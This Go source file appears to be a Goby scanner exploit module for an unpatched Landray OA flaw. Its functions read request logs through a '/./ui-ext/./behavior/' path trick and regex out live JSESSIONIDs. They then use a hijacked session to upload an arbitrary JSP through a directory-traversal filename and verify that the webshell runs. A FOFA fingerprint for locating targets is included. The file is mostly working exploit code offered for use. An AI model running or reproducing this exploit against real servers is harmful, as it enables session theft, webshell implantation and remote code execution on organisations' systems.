package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Landray OA Session Disclosure And Arbitrary File Upload Vulnerability",
    "Description": "<p>The attacker uses the logic of setting \"/ui ext/\" to be empty when processing the path through OA to read the session through the directory, and uses the arbitrarily obtained session to upload any file to obtain the webshell.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2022-06-15",
    "Author": "admin@javap.org",
    "FofaQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "GobyQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "Level": "3",
    "Impact": "<p>The attacker uses the logic of setting \"/ui ext/\" to be empty when processing the path through OA to read the session through the directory, and uses the arbitrarily obtained session to upload any file to obtain the webshell.</p>",
    "Recommendation": "<p>The official has not fixed this vulnerability yet. Please continue to pay attention to the official update.</p><p><a href=\"https://www.landray.com.cn\">https://www.landray.com.cn</a></p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "11111222.jsp",
            "show": ""
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "<%=123%>",
            "show": ""
        },
        {
            "name": "jsessionId",
            "type": "input",
            "value": "",
            "show": "可为空，程序自动获取"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "蓝凌新一代数字化 OA session 泄露及任意文件上传漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">蓝凌OA是一款针对中小企业的移动化智能办公产品，融合了钉钉数字化能力与蓝凌多年OA产品与服务经验，能全面满足企业日常办公在线、企业文化在线、客户管理在线、人事服务在线、行政务服务在线等需求。<br></span></p><p><span style=\"color: var(--primaryFont-color);\">攻击者利用蓝凌OA处理路径时将 “</span><span style=\"color: var(--primaryFont-color);\">/ui-ext/</span><span style=\"color: var(--primaryFont-color);\">” 置为空的逻辑穿越目录读取 session，并利用任意获取的 session 进行任意文件上传，获取 webshell。</span><br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请持续关注官方更新。<a href=\"https://www.landray.com.cn\" target=\"_blank\">https://www.landray.com.cn</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者利用蓝凌OA处理路径时将 “</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">/ui-ext/</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">” 置为空的逻辑穿越目录读取 session，并利用任意获取的 session 进行任意文件上传，获取 webshell。</span><br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "信创",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Landray OA Session Disclosure And Arbitrary File Upload Vulnerability",
            "Product": "Landray-OA",
            "Description": "<p>The attacker uses the logic of setting \"/ui ext/\" to be empty when processing the path through OA to read the session through the directory, and uses the arbitrarily obtained session to upload any file to obtain the webshell.<br><br></p>",
            "Recommendation": "<p>The official has not fixed this vulnerability yet. Please continue to pay attention to the official update.<br></p><p><a href=\"https://www.landray.com.cn\" target=\"_blank\">https://www.landray.com.cn</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">The attacker uses the logic of setting \"/ui ext/\" to be empty when processing the path through OA to read the session through the directory, and uses the arbitrarily obtained session to upload any file to obtain the webshell.</span><br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	uploadFile := func(host *httpclient.FixUrl, jsessionid string, filename string, fileContent string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/sys/mutillang/import.do?method=excelImport")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryBJHAAbia048HXMZE")
		cfg.Header.Store("Cookie", "JSESSIONID="+jsessionid)
		cfg.Data = "------WebKitFormBoundaryBJHAAbia048HXMZE\r\nContent-Disposition: form-data; name=\"initfile\"; filename=\"/../../../../../ekp/" + filename + "\"\r\nContent-Type: application/zip\r\n\r\n" + fileContent + "\r\n------WebKitFormBoundaryBJHAAbia048HXMZE--\r\n"

		return httpclient.DoHttpRequest(host, cfg)
	}

	getSession := func(host *httpclient.FixUrl, logFilename string) string {
		cfg := httpclient.NewGetRequestConfig("/./ui-ext/./behavior/" + logFilename)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 30

		if resp, err := httpclient.DoHttpRequest(host, cfg); err == nil && resp.StatusCode == 200 && resp.RawBody != "" {
			if jsessionids := regexp.MustCompile(`\d\t([A-F\d]{32})\t.*\n$`).FindStringSubmatch(resp.RawBody); len(jsessionids) > 1 {
				// 直接返回文件最后一个 jsessionid
				return jsessionids[1]
			}
		}
		return ""
	}

	getRequestLogFileName := func(host *httpclient.FixUrl) string {
		cfg := httpclient.NewGetRequestConfig("/./ui-ext/./behavior/")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		if resp, err := httpclient.DoHttpRequest(host, cfg); err == nil && resp.StatusCode == 200 && resp.RawBody != "" {
			if filename := regexp.MustCompile(`(.*?\.log.*?)\n`).FindStringSubmatch(resp.RawBody); len(filename) > 1 {
				// 返回第一个文件
				return filename[1]
			} else {
				return "request.log"
			}
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 第一步：查看 log 文件夹下的目录名
			if requestLogNames := getRequestLogFileName(u); requestLogNames != "" {

				// 第二步：获取 log 中的 session
				if jsessionid := getSession(u, requestLogNames); jsessionid != "" {

					// 生成随机文件名及字符
					filename := goutils.RandomHexString(6) + ".jsp"
					randStr := goutils.RandomHexString(16)

					// 第三步：上传文件
					if resp, err := uploadFile(u, jsessionid, filename, randStr); err == nil && resp.StatusCode == 200 && !strings.Contains(resp.RawBody, "Exception") && strings.Contains(resp.RawBody, "/sys/mutillang/import.do?method=excelImport") {

						// 第四步：访问上传的文件
						cfg := httpclient.NewGetRequestConfig("/" + filename)
						cfg.VerifyTls = false
						cfg.FollowRedirect = false
						cfg.Timeout = 15
						cfg.Header.Store("Cookie", "JSESSIONID="+jsessionid)

						if resp2, err2 := httpclient.DoHttpRequest(u, cfg); err2 == nil {
							return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, randStr)
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			fileName := ss.Params["fileName"].(string)
			fileContent := ss.Params["fileContent"].(string)
			jsessionid := ss.Params["jsessionId"].(string)

			if jsessionid == "" {
				// 第一步：查看 log 文件夹下的目录名
				if requestLogNames := getRequestLogFileName(expResult.HostInfo); requestLogNames != "" {
					// 第二步：获取 log 中的 session
					jsessionid = getSession(expResult.HostInfo, requestLogNames)
				}
			}

			if jsessionid != "" {
				// 第三步：上传文件
				if resp, err := uploadFile(expResult.HostInfo, jsessionid, fileName, fileContent); err == nil && resp.StatusCode == 200 && !strings.Contains(resp.RawBody, "Exception") && strings.Contains(resp.RawBody, "/sys/mutillang/import.do?method=excelImport") {

					// 第四步：访问上传的文件
					cfg := httpclient.NewGetRequestConfig("/" + fileName)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					cfg.Timeout = 15
					cfg.Header.Store("Cookie", "JSESSIONID="+jsessionid)

					if resp2, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err2 == nil {
						if resp2.StatusCode == 200 {
							expResult.Success = true
							expResult.Output = "Jsessionid: " + jsessionid + "\n文件地址：/" + fileName
						}
					}
				}
			}

			return expResult
		},
	))
}

//
// 
// 